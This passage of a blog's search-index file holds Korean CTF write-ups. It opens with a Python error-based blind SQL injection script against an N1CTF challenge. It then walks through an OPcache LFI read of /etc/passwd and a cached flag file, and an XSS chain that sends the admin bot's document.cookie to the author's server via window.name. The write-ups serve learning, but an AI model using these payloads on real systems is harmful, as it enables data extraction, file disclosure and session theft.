<span class="built_in">range</span>(<span class="number">48</span>, <span class="number">123</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(table_2, i, j+<span class="number">1</span>, <span class="built_in">chr</span>(k))</span><br><span class="line"><span class="keyword">if</span> k == <span class="number">92</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">column1 += <span class="built_in">chr</span>(k).lower()</span><br><span class="line">print(<span class="string">&quot;[+] n1key, 1_Column_Name : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(column1))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">column2 += <span class="built_in">chr</span>(k).lower()</span><br><span class="line">print(<span class="string">&quot;[+] n1key, 2_Column_Name : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(column2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keylen</span>():</span></span><br><span class="line"><span class="keyword">global</span> key_len</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((select length(`key`) from &#123;&#125;)=&#123;&#125;, exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;));#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(table_2, i)</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">key_len = i</span><br><span class="line">print(<span class="string">&quot;[+] n1key, Key Length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Key</span>():</span></span><br><span class="line"><span class="keyword">global</span> key</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((select `key` from &#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;), exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;));#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">123</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(table_2, i+<span class="number">1</span>, <span class="built_in">chr</span>(j))</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">key += <span class="built_in">chr</span>(j).lower()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;[+] n1key, Key : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">url = <span class="string">&#x27;http://101.32.205.189/?input=O:4:&quot;flag&quot;:1:&#123;s:5:&quot;check&quot;;s:25:&quot;&#x27;</span> + key + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.get(url)</span><br><span class="line">flag = res.text.split(<span class="string">&quot;&lt;/code&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;code&gt;&quot;</span>)[<span class="number">0</span>].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;[+] &quot;</span> + flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">table_name1()</span><br><span class="line">table_len2()</span><br><span class="line">table_name2()</span><br><span class="line">table_name2_column()</span><br><span class="line">column()</span><br><span class="line">keylen()</span><br><span class="line">Key()</span><br><span class="line"><span class="comment">#flag()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Start&quot;</span>)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/dbezPc/btqK7BaOTRJ/KevJzpGaeCCMJe09wkZ5u1/img.png"></p><p>익스플로잇 코드를 하나하나 짜서 확인해보니 마지막에 key라는 칼럼이 존재하는 것을 알게 됐고, key 값에 문제에서 원하는 key 값이 존재하는 것을 볼 수 있었습니다. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.32.205.189&#x2F;?input&#x3D;O:4:%22flag%22:1:&#123;s:5:%22check%22;s:25:%22n1ctf20205bf75ab0a30dfc0c%22&#125;</span><br></pre></td></tr></table></figure><p>마지막으로 뽑은 Key 값을 이용해서 POI를 해주니 FLAG를 출력해주는 것을 볼 수 있었습니다. Error Based Blind SQL Injection (EXP 함수 활용) 글 작성하고 여기서 쓰이군요 :)</p><blockquote><p>FLAG : n1ctf{you_g0t_1t_hack_for_fun}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP Object Injection </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3k CTF 2020 Write Up</title>
      <link href="2020/07/26/2020-07-26-3K-CTF-2020/"/>
      <url>2020/07/26/2020-07-26-3K-CTF-2020/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-carthagods-496-pts"><a href="#Web-carthagods-496-pts" class="headerlink" title="(Web) carthagods [496 pts]"></a>(Web) carthagods [496 pts]</h2><blockquote><p>carthagods 문제는 opcache 엔진에서 발생하는 취약점을 이용해서 FLAG 파일을 릭 하는 문제입니다.</p></blockquote><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/Ujhnb/btqF0QEIvAL/uvEXi0CpxfkTSUsCQtkvf0/img.png"></p><p>문제로 들어와 보니 6가지 카테고리 가 있는 것을 볼 수 있습니다. 일단 제일 먼저 눈에 띄는 건 <code>FLAG</code>라는 카테고리 입니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/HFT8O/btqF15tIUIO/Ye9KcFOCVstLCRu8vCxEj0/img.png"></p><p><code>FLAG</code> 카테고리로 들어와 보니 <code>flag.php</code>로 요청을 하는데 유튜브 영상만 보이는 것을 볼 수 있습니다. 소스 코드를 봐도 필요한 것들이 보이진 않아서 <code>phpinfo</code>를 확인해 보기로 했습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/u3mBf/btqF3F8UoSj/QyJ9Qt4UWSq3LYC9vdV1s0/img.png"></p><p><code>phpinfo</code> 카테고리로 들어와 보니 php 버전이 <code>7.2~</code>인 것을 볼 수 있습니다. 저번에 제가 CVE 취약점들을 둘러보다가 <code>php 7.2.24</code>에서 터지는 취약점을 한 번 본 적이 있는데 해당 취약점은 php 7.3.11과 7.2.24에서 RCE가 터지는 취약점 <code>CVE 2019-11043</code>였습니다. 하지만 이번 문제는 이를 이용해서는 풀 수 없을 거 같아 좋다 말았는데 2시간정도 <code>phpinfo</code>의 값을 기준으로 구글링을 하다가 <code>OPcache</code>란 것을 알게 되었습니다.  </p><p><code>OPcache</code>는  <code>PHP 7.0</code>에 내장된 새로운 캐시 엔진이라고 합니다. 이 엔진은 php 코드를 <code>컴파일</code>하여 나온 결과를 <code>바이트 코드 형태로 메모리에 저장</code>해줍니다.</p><p>또 php.ini 설정 파일 내에 <code>캐시 정보의 해당 폴더</code>를 지정해준다고 합니다. 즉, 파일이 저장될 경로가 정해지는 것 입니다. 그럼 캐시 정보의 해당 폴더가 <code>/admin/</code>이라고 가정하에 <code>flag.php</code> 파일을 저장한다고 해봅시다.</p><p>제일 먼저 <code>flag.php</code> 파일이 <code>OPcache</code>에 의해 컴파일되어 그 결과를 <code>바이트 코드 형태로 메모리에 저장</code>을 할 것인데 저장은 <code>/admin/[system_id]/flag.php.bin</code>와 같이 이렇게 저장이 될 것입니다. 경로 뒤에는 <code>system_id</code>가 붙은 후에 뒤에 파일이 붙는 거 같습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/DxsFr/btqF1AVeB5A/jjPw9Nilk6wZQGDgd1GxrK/img.png"></p><p>혹시나 이 취약점을 이용해서 풀 수 있을 거 같아서 <code>phpinfo</code>에서 <code>opcache</code>를 검색해 보니 <code>file_cache</code>를 사용하는 것을 볼 수 있습니다. 보면 해당 폴더가 <code>/var/www/cache/</code>로 되어 있는 것을 볼 수 있습니다. 그러니 만약에 flag.php라는 파일을 저장한다고 하면 OPcache에 의해 컴파일된 후에 <code>/var/www/cache/[system_id]/flag.php.bin</code>으로 저장이 될 것입니다.</p><p>생각해 보면 <code>flag.php</code>라는 파일이 실제로 존재하고 해당 파일이 <code>/var/www/cache/[system_id]/flag.php.bin</code>에 저장되어 있다고 생각 들어 이 시나리오를 이용해 해결하기로 했습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/BCg5P/btqF1CepJ02/LN0FckJWxn1Sdi6nusjAF1/img.png"></p><p>하지만 <code>system_id</code>를 구하는 방법을 몰라 구글링을 해보았는데, <code>system_id</code>를 찾아주는 코드가 <code>Gitbub</code>에 올라와 있는 것을 발견했습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/eOj3lN/btqF3b1ibhx/IPFpmRkCQenTc7oXDSaYbK/img.png"></p><p>해당 문제 <code>phpinfo</code> 파일 소스 코드를 복사해 info.html로 만들어 준 후에 코드를 돌려보니 <code>system Id</code>를 찾아주는 것을 볼 수 있었습니다.</p><p>이제 <code>flag.php</code> 파일이 <code>/var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin</code>에 저장되어 있는 것을 알게 되었습니다. 그런데 해당 경로로 접근하려면 <code>LFI</code>가 터지는 곳을 찾아야 하니 찾아보았습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/045Wy/btqF3cy7QQC/UKVTYm12XzJkAP4ndxu4B0/img.png"></p><p>문제에서 소스 코드를 보니 일단 <code>js</code> 코드들이 많이 있었습니다. 하나 하나 다 접속해보니 <code>path traversal</code>이 터질 거 같은 부분은 나오지 않았습니다. 그러다가 마지막에 <code>/js/main.js</code> 부분에서 상위로 올라가 /js로 접근을 해보니 이상한 것을 발견했습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/4K7Ds/btqF3csnyxG/jpp2di3Rc8fFnGIeEo8zw1/img.png"></p><p>분명 <code>/js</code>로 접근을 했는데 <code>?eba1b61134bf5818771b8c3203a16dc9=js</code> 이렇게 Parameter가 js로 접근을 해주고 있었습니다. 뭔가 저 파라미터를 이용해서 <code>LFI</code>가 터질 거 같았습니다. 그래서 <code>LFI</code> 취약점의 유무를 확인하기 위해  <code>/etc/passwd</code>로 접근을 해보았습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/KqV2C/btqF1oAIjo1/JcbZGWoNFwcUQSkHhh2OlK/img.png"></p><p>처음에는 <code>http://carthagods.3k.ctf.to:8039/js/?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd</code> 이렇게 요청을 보내주었는데 계속 <code>403</code> 에러가 발생했습니다. 그래서 그냥 경로 없이 <code>http://carthagods.3k.ctf.to:8039/?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd</code> 이렇게 바로 보내주니 <code>LFI</code>가 잘 터지는 것을 볼 수 있었습니다. </p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bF0Dvp/btqF1RWL5xt/ZVfG3qz4EjnesJIRUgOVD1/img.png"></p><p>그래서 바로 <code>flag.php</code>가 저장되어 있는 경로<code>http://carthagods.3k.ctf.to:8039/eba1b61134bf5818771b8c3203a16dc9=../../../../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin</code>로 접근을 해주니 <code>flag.php.bin</code> 파일이 출력되는 것을 볼 수 있었습니다. 이번 문제를 풀면서 <code>opcache</code> 엔진에 대해 알아가 매우 좋은 문제였다고 개인적으로 생각합니다.</p><blockquote><p>FLAG : 3k{Hail_the3000_years_7hat_are_b3h1nd}</p></blockquote><hr><h2 id="Web-XSSER-499-pts"><a href="#Web-XSSER-499-pts" class="headerlink" title="(Web) XSSER [499 pts]"></a>(Web) XSSER [499 pts]</h2><blockquote><p>XSSER 챌린지는 php object injection 취약점을 이용해서 XSS를 트리거하고, window.name을 이용해 길이 제한을 우회해 XSS를 이용해서 쿠키를 탈취하는 문제 입니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isAdmin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nam</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$nam</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;isAdmin=<span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;login&#x27;</span>])))&#123;</span><br><span class="line">    <span class="variable">$use</span>=<span class="keyword">new</span> User(<span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line">    <span class="variable">$log</span>=serialize(<span class="variable">$use</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ?login=<span class="subst">$log</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$new_name</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(stripos(<span class="variable">$new_name</span>, <span class="string">&#x27;script&#x27;</span>))<span class="comment">//no xss :p </span></span><br><span class="line">                 &#123; </span><br><span class="line">                    <span class="variable">$new_name</span> = htmlentities(<span class="variable">$new_name</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">        <span class="variable">$new_name</span> = substr(<span class="variable">$new_name</span>, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1 style=&quot;text-align:center&quot;&gt;Error! Your msg &#x27;</span>.<span class="variable">$new_name</span>.<span class="string">&#x27;&lt;/h1&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Contact admin /req.php &lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">            setcookie(<span class="string">&quot;session&quot;</span>, <span class="variable">$flag</span>, time() + <span class="number">3600</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$check</span>=unserialize(substr(<span class="variable">$_GET</span>[<span class="string">&#x27;login&#x27;</span>],<span class="number">0</span>,<span class="number">56</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$check</span>-&gt;isAdmin)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;welcome back admin &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_end_clean();</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>만약에 <code>login</code>의 값이 존재하지 않으면 생성자 함수를 통해 생성하고 <code>Location</code>을 해줍니다. 그래서 문제로 들어오게 되면 바로 <code>?login=</code>으로 Location이 되는 거 같습니다. 그러니 이 부분에서 에러 발생을 유발해야 다음 동작들을 실행 할 수 있습니다. 에러가 나지 않으면 <code>new</code>의 값을 받고, <code>new</code>의 값로 xss를 터트릴 수 있는데 이 부분이 실행이 되지 않고 바로 리다이렉션이 되는 것 입니다. 첫 번째 목표는 저기에서 에러를 발생시키면 될 거 같습니다.</p><p>그리고 위에서 말했지만 밑에 보면 <code>new</code>라는 파라미터의 값이 돔으로 바로 들어가는 것을 볼 수 있습니다. 또한 <code>new</code>의 값이 <code>new_name</code>으로 들어가 검증을 하게 됩니다. 이때 <code>script</code>라는 문자가 있으면 참이 되어 <code>htmlentitle(</code>) 함수로 엔티티로 변환하기 때문에 <code>XSS</code>가 터지지 않습니다. 즉, <code>&lt;script&gt;</code>, <code>javascript:</code>와 같은 것들은 못 쓰게 됩니다. 그러므로 <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>와 같은 태그를 이용해서 스크립트를 짜서 XSS를 터트리면 될 거 같습니다.</p><p>또 밑에 보면 <code>REMOTE_ADDR</code>이 127.0.0.1이면 <code>Cookie</code>에 <code>FLAG</code>를 추가해주는 것을 볼 수 있습니다. 이 부분은 어드민 봇으로 보내주게 되면 알아서 처리 됩니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/a.png?raw=true"></p><p>그런데 일단 <code>Login</code> 하는 부분에서 에러를 발생해야 <code>XSS</code>를 터트려 쿠키를 탈취하던지 할 수 있습니다. 그래서 <code>serialize()</code>, <code>unserialize()</code>에 대해서 여러 가지를 검색을 해보았습니다. 그러다 직렬화된 문자열에 인스턴스화를 할 수 없게 하는 Class가 있는데, 역직렬화 할 때 해당 Class를 참조하게 되면 PHP가 에러를 내뱉는다고 합니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/SKjGz/btqF1Btn0Ev/L0UO8SwZFdPphU1JLl7dMk/img.png"></p><p>저 참고 자료 속 내용에 <code>(e.g. being abstract)</code>라는 구문이 있어 뭔가 <code>abstract</code>와 관련이 있을 거 같아 또 abstract에 대해 죽도록 구글링을 해보니 직렬화된 데이터로 <code>Traversable</code>라는 클래스를 <code>empty</code>로 넘겨주면 에러를 발생한다고 합니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cUdR6S/btqF3SAvkiZ/Cn0nU7qHiwhCWf1EZoC4mk/img.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$check</span>=unserialize(substr(<span class="variable">$_GET</span>[<span class="string">&#x27;login&#x27;</span>],<span class="number">0</span>,<span class="number">56</span>));</span><br></pre></td></tr></table></figure><p>그래서 <code>http://xsser.3k.ctf.to/?login=O:11:&quot;Traversable&quot;:0:&#123;&#125;</code> 이렇게 요청을 보내주니 역직렬화 하는 부분에서 에러가 발생해 리다이렉션이 되지 않은 것을 볼 수 있습니다 :)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$new_name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$new_name</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$new_name</span>, <span class="string">&#x27;script&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = htmlentities(<span class="variable">$new_name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$new_name</span> = substr(<span class="variable">$new_name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1 style=&quot;text-align:center&quot;&gt;Error! Your msg &#x27;</span>.<span class="variable">$new_name</span>.<span class="string">&#x27;&lt;/h1&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Contact admin /req.php &lt;/h1&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이제 Location 부분은 에러를 발생해서 리다이렉션이 일어나지 않을 것이고, <code>new</code> 파라미터를 보내주게 되면 위에 있는 코드 부분이 실행이 될 것입니다. 윗 부분에서도 한 번 이야기를 했지만 <code>script</code>라는 문자열이 들어간 <code>Tag</code>, <code>Attribute</code>는 사용하지 못합니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/chvPQn/btqF1B1dV2L/wyGz6Ypl4FmkVgh8S8g540/img.png"></p><p><code>script</code> Tag는 사용하지 못하므로 <code>svg</code> Tag를 사용해서 <code>xss</code>를 트리거 해보니 잘 되는 것을 확인 할 수 있었습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/n0LuU/btqF2RCjUjC/siwW2R3zm9HM0OPvuDyjS0/img.png"></p><p>팝업 창을 닫아 보니 <code>Contact admin /req.php</code>라는 문구가 떴습니다. 아마 <code>/req.php</code>가 <code>Admin Bot</code>이고 여길 통해 XSS를 해 쿠키를 탈취를 해야 하는 거 같습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/dM1n0b/btqF14WbTVh/Qeyb3vKTTNeUkMqlYvjcg0/img.png"></p><p><code>/req.php</code>로 들어와 보니 <code>Name</code>, <code>Url</code>, <code>Message</code>를 입력해 Admin Bot으로 요청을 보낼 수 있습니다. 그런데 생각해보면 <code>new</code> 파라미터의 값의 길이는 32자로 제한이 있어 document.location을 이용해 내 서버로 쿠키를 탈취 할 수는 없었습니다. 여기서 막혀 잠을 자고 일어나 다시 구글링을 시작해보았는데 <code>window.name</code>을 이용해서 xss를 하는 것을 보았습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">&quot;document.location = `http://141.164.55.161:8080/info.php?data=` + document.cookie&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.location = <span class="string">&quot;http://127.0.0.1/?login=?login=O:11:%22Traversable%22:0:&#123;&#125;&amp;new=&lt;svg/onliad=eval(name)?&gt;&quot;</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>window.name</code>을 이용해 위와 같이 페이로드를 작성해주었습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cjKZw3/btqF1R3Rj1N/Hb6WOZDU2bFMqO0Djo4K40/img.png"></p><p>/req.php에서 <code>Url</code>을 입력하는 곳에 <code>제 서버 URL</code>을 입력해 전송을 해보니 스크립트가 잘 실행이 되어 <code>flag.txt</code>가 생긴 것을 볼 수 있었고, 그 값으로 FALG가 들어 있는 것을 볼 수 있었습니다.</p><blockquote><p>FLAG : 3k{3asy_XsS_&amp;_pHp_Ftw}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> LFI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
